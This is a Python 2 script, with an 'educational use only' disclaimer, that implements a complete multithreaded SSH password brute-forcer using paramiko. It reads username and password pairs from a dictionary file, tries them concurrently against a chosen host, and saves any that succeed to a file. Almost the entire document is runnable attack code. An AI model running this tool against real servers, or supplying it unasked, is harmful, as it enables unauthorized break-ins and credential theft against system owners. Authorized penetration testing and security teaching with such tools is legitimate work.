#!/usr/bin/env python
'''
DISCLAIMER: This program is for educational use only.
Don't use it to crack a real server. You could get
into a lot of trouble. This is just a simple demo
to show how to use paramiko in combination with files.
Use it at your own risk!
'''
import argparse
import paramiko 
import threading
from os import path, access, R_OK
from sys import exit
from time import sleep


existCalled = False

def main(Host, Dictionary, Port, Timeout, Connections, Output):
    """ Reads the dictionary and attempts to connect with the username and password on each line
        
        Keyword arguments:
        Host -- Host to attempt the SSH connection to
        Dictionary -- Dictionary file to locate username and passwords
        Port -- Port to connect to (default 22)
        Timeout -- Timeout in seconds (default 30)
        Connections -- Number of concurrent ssh connections/threads to allow (default 5)
        Output -- Output filename to write successful username & password to

    """
    if path.exists(Dictionary) and path.isfile(Dictionary) and access(Dictionary, R_OK):
        fd = open(Dictionary, "r")
        print '[+] Bruteforcing against %s with dictionary %s' % (Host, Dictionary)
        for line in fd.readlines():
            try:
                #make sure we only create connections when we have theads available
                while threading.activeCount() > Connections:
                    t.join(1)

                Username, Password = line.strip().split(" ")
                t = threading.Timer(0,attempt, args=(Host, Username, Password, Port, Timeout, Output))
                t.start()
            except Exception, e:
                try:
                    e[1]
                    code, reason = e.args
                    print "[ERROR] %s (%d)" %(reason,code)
                except IndexError:
                    print "[ERROR] %s " %(e.args[0])
            except (KeyboardInterrupt, SystemExit):
                t.cancel()
                fd.close()
                exit(0)
        fd.close()
    else:
        print "Dictionary file is either missing or not readable.\n"
        return

def attempt(Host,UserName,Password,Port=22,Timeout=30, Output="passwords_found.txt"):
    """ Attempts an SSH connection to the provided host
        
        Keyword arguments:
        Host -- Host to attempt the SSH connection to
        UserName -- UserName to use with SSH attempt
        Password -- Password to use with SSH attempt
        Port -- Port to connect to (default 22)
        Timeout -- Timeout in seconds (default 30)
        Output -- Output filename to write successful username & password to

    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(Host, username=UserName, password=Password,port=Port,timeout=Timeout)
    except paramiko.AuthenticationException:
        if existCalled != True:
            print '[-] %s %s fail!' % (UserName, Password)
    except Exception, e:
        try:
            e[1]
            code, reason = e.args
            print "[ERROR] %s on %s:%d (%d)" %(reason,Host,Port,code)
        except IndexError:
            print "[ERROR] %s on %s:%d " %(e.args[0],Host,Port)
    else:
        print '[!] %s %s is CORRECT!' % (UserName, Password)
        file = open(Output, 'a') #writes to file
        file.write("%s:%d user:\"%s\" pass:\"%s\" \n"%(Host,Port,UserName, Password))
        file.close()
    ssh.close()
    return


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="SSH Brute forcer")
    parser.add_argument('-d','--dictionary', dest='dictionary', action='store',default=None, help="path to dictionary file, should be in \"user pass\" format")
    parser.add_argument('-s','--source', dest='host', action='store',default='localhost', help='Host to scan, default localhost')
    parser.add_argument('-p','--port', dest='port', action='store',default=22, help='Port to connect to, default 22')
    parser.add_argument('-t','--timeout', dest='timeout', action='store',default=30, help='Timeout in seconds, default 30 seconds')
    parser.add_argument('-c','--connections', dest='connections', action='store',default=5, help='Concurrent connections, default 5')
    parser.add_argument('-o','--output', dest='output', action='store',default=None, help='Output file name, where passwords found gets saved')
    args = parser.parse_args()

    if args.output is None:
        args.output = "%s_passwords_found.txt" %(args.host)

    if args.dictionary is None:
        print "[-] Please provide a dictionary file location.\n"
        exit(0)
    try:
        main(args.host, args.dictionary, int(args.port), int(args.timeout), int(args.connections), str(args.output))
    except (KeyboardInterrupt, SystemExit):
        existCalled = True
        print "\nStopping all threads\n"
        
    